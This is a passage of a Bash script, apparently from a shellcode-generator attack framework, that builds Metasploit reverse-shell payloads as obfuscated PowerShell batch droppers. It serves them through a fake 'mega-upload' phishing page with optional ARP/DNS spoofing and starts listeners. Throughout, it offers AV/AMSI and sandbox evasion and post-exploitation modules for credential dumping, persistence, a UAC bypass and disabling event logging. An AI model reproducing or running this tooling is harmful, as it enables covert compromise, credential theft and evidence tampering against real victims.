serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.ps1\n$IPATH/output/installer.bat\n\nchose how to deliver: installer.bat" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      zenity --title="☠ SHELLCODE GENERATOR ☠" --text "Store $N4m in apache2 webroot and\nexecute installer.bat on target machine" --info --width 300 > /dev/null 2>&1
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
         fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2


   else


      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 350 --height 300) > /dev/null 2>&1

  if [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi
  fi


      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|installer.bat|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.ps1 $ApAcHe/$N4m.ps1 > /dev/null 2>&1
      cp installer.bat $ApAcHe/installer.bat > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|installer.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.ps1 $ApAcHe/$N4m.ps1
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
          fi


        else

        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" 
            else
              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
          fi
        fi
   fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
rm $IPATH/output/chars.raw > /dev/null 2>&1
rm $ApAcHe/$N4m.ps1 > /dev/null 2>&1
rm $ApAcHe/installer.bat > /dev/null 2>&1
rm $ApAcHe/index.html > /dev/null 2>&1
rm /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
sleep 2
clear
cd $IPATH/

else

  echo ${RedF}[x]${white} Abort module execution ..${Reset};
  sleep 2
  sh_microsoft_menu
  clear
fi
}





# ----------------------------------------------------
# build shellcode in PSH-CMD (windows BAT) ReL1K :D 
# reproduction of powershell.bat payload in unicorn.py
# ----------------------------------------------------
sh_shellcode12 () {
# get user input to build shellcode
echo "[☠] Enter shellcode settings!"
lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 300) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 300) > /dev/null 2>&1
N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: ReL1K" --width 300) > /dev/null 2>&1
# input payload choise
paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 300) > /dev/null 2>&1


## setting default values in case user have skip this ..
if [ -z "$lhost" ]; then lhost="$IP";fi
if [ -z "$lport" ]; then lport="443";fi
if [ -z "$N4m" ]; then N4m="ReL1K";fi

echo "[☠] Building shellcode -> psh-cmd format ..."
sleep 2
if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
   echo "[☠] meterpreter over SSL sellected ..";sleep 1
fi

# display final settings to user
cat << !

    venom settings
    ╔─────────────────────
    | LPORT   : $lport
    | LHOST   : $lhost
    | FORMAT  : PSH-CMD -> WINDOWS
    |_PAYLOAD : $paylo

!

# use metasploit to build shellcode
KEYID=$(cat /dev/urandom | tr -dc '13' | fold -w 3 | head -n 1)
if [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw"
else
xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw"
fi


# display shellcode
disp=`cat $IPATH/output/chars.raw | awk {'print $12'}`
echo ""
echo "[☠] obfuscating -> base64 encoded!"
sleep 2
echo $disp
echo ""
sleep 2

# EDITING/BACKUP FILES NEEDED
echo ""
echo "[☠] editing/backup files..."
cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
sleep 2

   # check if chars.raw as generated
   if [ -e $Ch4Rs ]; then
      echo "[☠] chars.raw -> found!"
      sleep 2
 
   else

      echo "[☠] chars.raw -> not found!"
      exit
      fi


# injecting shellcode into name
cd $IPATH/output/
echo "[☠] Injecting shellcode -> $N4m.bat!"
sleep 2
OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" FALSE "Relik PS obfuscation" --width 353 --height 255) > /dev/null 2>&1
if [ "$OBF" = "None-Obfuscation (default)" ]; then
echo "@echo off&&powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $disp" >> $N4m.bat
elif [ "$OBF" = "Relik PS obfuscation" ]; then
echo "powershell /w 1 /C \"s''v rl -;s''v Ln e''c;s''v mYz ((g''v rl).value.toString()+(g''v Ln).value.toString());powershell (g''v mYz).value.toString()('$disp')\"" >> $N4m.bat
else
echo "[✔] String obfuscation technics sellected .."
# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
# HINT: setting -ExecutionPolicy/-ep is redundant since -EncodedCommand/-enc automatically bypasses the execution policy
#
# STRING: cmd.exe /c powershell.exe -NoPRo -wIN 1 -nONi -eN $disp
echo "@e%!%ch^O Of^f&&(,(,, (,;Co%LD%p%La%y %windir%\\\Le%!HuB!%git^Che%i%ck^Co%U%nt%-3%rol\".\"d^ll %temp%\\key^s\\Le^git^C%OM%he^ck^Cont%-R%rol.t^m%A%p));,, )&,( (,, @pi%!h%n^g -^n 4 w%%!hw^w.mi^cro%d0b%sof^t.c^o%OI%m > %tmp%\\lic%dR%e^ns%at%e.p^em);, ,) &&,(, (,,%$'''%, (,;c^Md%i%\".\"e%i0%X^e ,,/^R =c^O%Unt-8%p^Y /^Y %windir%\\Sy^s%dE%te^m%-%32\\Win^do%'''%w^s%AT%Power%Off%s^he%$'''%ll\\\v1.0\\p^o%IN%we^rs^%-iS%hell.e%!'''$%x%-i%e ,;^, %tmp%\\W^UAU%-Key%CTL.m%$%s%$'''%c &&,,, @c^d ,, %tmp% && ,;WU%VoiP%AUC%$,,,,%TL.m%-8%s^c /^No%db%PR^o  /w%Eb%\"I\"^N 1 /^%$'''%n\"O\"N%Func%i  /^eN%GL% $disp),) %i% ,,)" > $N4m.bat
fi
chmod +x $IPATH/output/$N4m.bat


# CHOSE HOW TO DELIVER YOUR PAYLOAD
serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.bat\nchose how to deliver: $N4m.bat" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 230) > /dev/null 2>&1

   if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
      echo "[☠] Start a multi-handler..."
      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
      echo "[☯] Please dont test samples on virus total..."
        if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
           fi

          cd $IPATH/output
          # delete utf-8/non-ancii caracters from output
          tr -cd '\11\12\15\40-\176' < report.log > final.log
          sed -i "s/\[0m//g" final.log
          sed -i "s/\[1m\[34m//g" final.log
          sed -i "s/\[4m//g" final.log
          sed -i "s/\[K//g" final.log
          sed -i "s/\[1m\[31m//g" final.log
          sed -i "s/\[1m\[32m//g" final.log
          sed -i "s/\[1m\[33m//g" final.log
          mv final.log $N4m-$lhost.log > /dev/null 2>&1
          rm report.log > /dev/null 2>&1
          cd $IPATH/
        else

          if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; exploit'"
          else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
          fi
        fi
      sleep 2


   else


P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "enum_system.rc" FALSE "dump_credentials.rc" FALSE "fast_migrate.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "stop_logfiles_creation.rc" FALSE "exploit_suggester.rc" --width 305 --height 350) > /dev/null 2>&1

  if [ "$P0" = "persistence.rc" ]; then
  M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.bat on target every 23 hours" --width 300) > /dev/null 2>&1

    cd $IPATH/aux
    # Build persistence script (AutoRunStart='multi_console_command -r')
    cp persistence.rc persistence[bak].rc
    sed -i "s|N4m|$N4m.bat|g" persistence.rc
    sed -i "s|IPATH|$IPATH|g" persistence.rc
    sed -i "s|M1P|$M1P|g" persistence.rc

    # Build listenner resource file
    echo "use exploit/multi/handler" > $lhost.rc
    echo "set LHOST $lhost" >> $lhost.rc
    echo "set LPORT $lport" >> $lhost.rc
    echo "set PAYLOAD $paylo" >> $lhost.rc
    echo "exploit" >> $lhost.rc
    mv $lhost.rc $IPATH/output/$lhost.rc
    cd $IPATH

    elif [ "$P0" = "privilege_escalation.rc" ]; then
      cd $IPATH/aux
      # backup files needed
      cp privilege_escalation.rc privilege_escalation[bak].rc
      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
      # Build resource files needed
      sed -i "s|N4m|$N4m.bat|g" privilege_escalation.rc
      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
      sed -i "s|N4m|$N4m.bat|g" enigma_fileless_uac_bypass.rb
      # reload metasploit database
      echo "[☠] copy post-module to msf db!"
      cp enigma_fileless_uac_bypass.rb $pHanTom/post/windows/escalate/enigma_fileless_uac_bypass.rb
      echo "[☠] reloading -> Metasploit database!"
      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
      cd $IPATH

  elif [ "$P0" = "stop_logfiles_creation.rc" ]; then
    #
    # check if dependencies exist ..
    #
    if [ -e "$pHanTom/post/windows/manage/Invoke-Phant0m.rb" ]; then
      echo "[☠] Invoke-Phant0m.rb installed .."
      sleep 2
    else
      echo "[x] Invoke-Phant0m.rb not found .."
      sleep 2
      echo "[☠] copy Invoke-Phant0m.rb to msfdb .."
      sleep 2
      cp $IPATH/aux/msf/Invoke-Phant0m.rb $pHanTom/post/windows/manage/Invoke-Phant0m.rb > /dev/null 2>&1
      echo "[☠] Reloading msfdb database .."
      sleep 2
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfdb reinit" > /dev/null 2>&1
      xterm -T "RELOADING MSF DATABASE" -geometry 110x23 -e "msfconsole -q -x 'db_status; reload_all; exit -y'" > /dev/null 2>&1
    fi

      #
      # check if Invoke-Phantom.ps1 exists ..
      #
      if [ -e "$IPATH/aux/Invoke-Phant0m.ps1" ]; then
        echo "[☠] Invoke-Phant0m.ps1 found .."
        sleep 2
        cp $IPATH/aux/Invoke-Phant0m.ps1 /tmp/Invoke-Phant0m.ps1 > /dev/null 2>&1
      else
        echo "[x] Invoke-Phant0m.ps1 not found .."
        sleep 2
        echo "[☠] Please place module in $IPATH/aux folder .."
        sleep 2
        exit
      fi


  else

    echo "do nothing" > /dev/null 2>&1

fi

      # edit files nedded
      cd $IPATH/templates/phishing
      cp $InJEc12 mega[bak].html
      sed "s|NaM3|$N4m.bat|g" mega.html > copy.html
      cp copy.html $ApAcHe/index.html > /dev/null 2>&1
      cd $IPATH/output
      cp $N4m.bat $ApAcHe/$N4m.bat > /dev/null 2>&1
      echo "[☠] loading -> Apache2Server!"
      echo "---"
      echo "- SEND THE URL GENERATED TO TARGET HOST"

        if [ "$D0M4IN" = "YES" ]; then
        # copy files nedded by mitm+dns_spoof module
        sed "s|NaM3|$N4m.bat|" $IPATH/templates/phishing/mega.html > $ApAcHe/index.html
        cp $IPATH/output/$N4m.bat $ApAcHe/$N4m.bat
        echo "- ATTACK VECTOR: http://mega-upload.com"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
           fi
          fi


        else


        echo "- ATTACK VECTOR: http://$lhost"
        echo "- POST EXPLOIT : $P0"
        echo "---"
        # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
        echo "[☠] Start a multi-handler..."
        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
        echo "[☯] Please dont test samples on virus total..."
          if [ "$MsFlF" = "ON" ]; then

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           else
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi

            cd $IPATH/output
            # delete utf-8/non-ancii caracters from output
            tr -cd '\11\12\15\40-\176' < report.log > final.log
            sed -i "s/\[0m//g" final.log
            sed -i "s/\[1m\[34m//g" final.log
            sed -i "s/\[4m//g" final.log
            sed -i "s/\[K//g" final.log
            sed -i "s/\[1m\[31m//g" final.log
            sed -i "s/\[1m\[32m//g" final.log
            sed -i "s/\[1m\[33m//g" final.log
            mv final.log $N4m-$lhost.log > /dev/null 2>&1
            rm report.log > /dev/null 2>&1
            cd $IPATH/
          else

           if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ] || [ "$paylo" = "windows/meterpreter/reverse_https" ] || [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           else
            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
          fi
        fi
   fi
fi


sleep 2
# CLEANING EVERYTHING UP
echo "[☠] Cleanning temp generated files..."
mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
